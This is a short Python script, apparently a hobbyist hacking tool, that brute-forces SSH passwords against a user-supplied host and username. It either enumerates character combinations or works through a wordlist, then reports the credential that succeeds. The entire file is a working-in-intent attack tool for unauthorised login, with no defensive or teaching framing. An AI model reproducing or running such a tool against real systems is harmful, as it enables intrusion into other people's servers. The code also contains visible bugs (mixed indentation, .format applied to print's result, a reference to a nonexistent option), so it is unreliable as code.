#!/usr/bin/env python
#Coded by Blackhole
import os
import thread
import itertools
from itertools import combinations
import time
import socket
import paramiko
import optparse
import sys
parser = optparse.OptionParser()
parser.add_option("-u", "--usr", action="store", dest="user", help="Target username", default="no_user_supplied")
parser.add_option("-t", "--hst", action="store", dest="host", help="Target host", default="no_host_supplied")
parser.add_option("-p", "--psw", action="store", dest="pass_list", help="Password list", default="no_list_supplied")
options, args = parser.parse_args()
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
if(options.user=="no_user_supplied"):
	print("Error. You must supply a username.")
	try:
		exit()
	except:
		sys.exit()
if(options.host=="no_host_supplied"):
	print("you must enter a host")
	try:
		exit()
	except:
		sys.exit()
host = socket.gethostbyname(options.host)
if(options.pass_list=="no_list_supplied"):
	chars = '1234567890abcdefghijlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+=-`|}{[]\":;?/>.<,'
	list = []
	for char in chars:
		list.append(char)
	count = 1
	start_time = time.time()
	for num in range(1,10000):
		for combo in itertools.combinations_with_replacement(list,num):
			c = ''.join(combo)
			print("Attacking: SSH | User: {} | Host: {} | Trying key {}: {}").format(options.user,host,count,c)
		        try:
		                ssh.connect(host,username=options.user.strip(),password=c)
		                print(" ")
	        	        print("Attacking complete")
	                	print("Time elapsed: {} (sec.) - {} (min.)").format(time.time() - start_time, time.time() - start_time / 60)
	                	print("Service: SSH | Host: {} | Username: {} | Password: {}").format(host,options.c)
	                	break
		        except paramiko.AuthenticationException:
		                pass
		        except paramiko.ssh_exception.SSHException:
		                pass
		        count += 1
	else:
	        print(" ")
	        print("0 valid passwords found")
	        try:
	                exit()
	        except:
	                sys.exit()
elif(options.pass_list != "no_list_supplied"):
	try:
		pass_list = open(options.pass_list, 'r')
		num_lines = sum(1 for line in open(options.pass_list, 'r'))
	except:
		print("Error Cannon open Password list: {}").format(options.pass_list)
		try:
			exit()
		except:
			sys.exit()
	start_time = time.time()
	count = 1
	for password in pass_list:
		print("Attacking: SSH | User: {} | Host: {} | Trying key {}: {}").format(options.user,host,count,password)
		try:
			ssh.connect(host,username=options.user.strip(),password=password.strip())
			print(" ")
			print("Attacking complete")
			print("Time elapsed: {} (sec.) - {} (min.)").format(time.time() - start_time, time.time() - start_time / 60)
			print("Service: SSH | Host: {} | Username: {} | Password: {}").format(host,options.user,password)
			break
		except paramiko.AuthenticationException:
			pass
		except paramiko.ssh_exception.SSHException:
			pass
		count += 1
	else:
		print(" ")
		print("0 valid passwords found")
		try:
			exit()
		except:
			sys.exit()
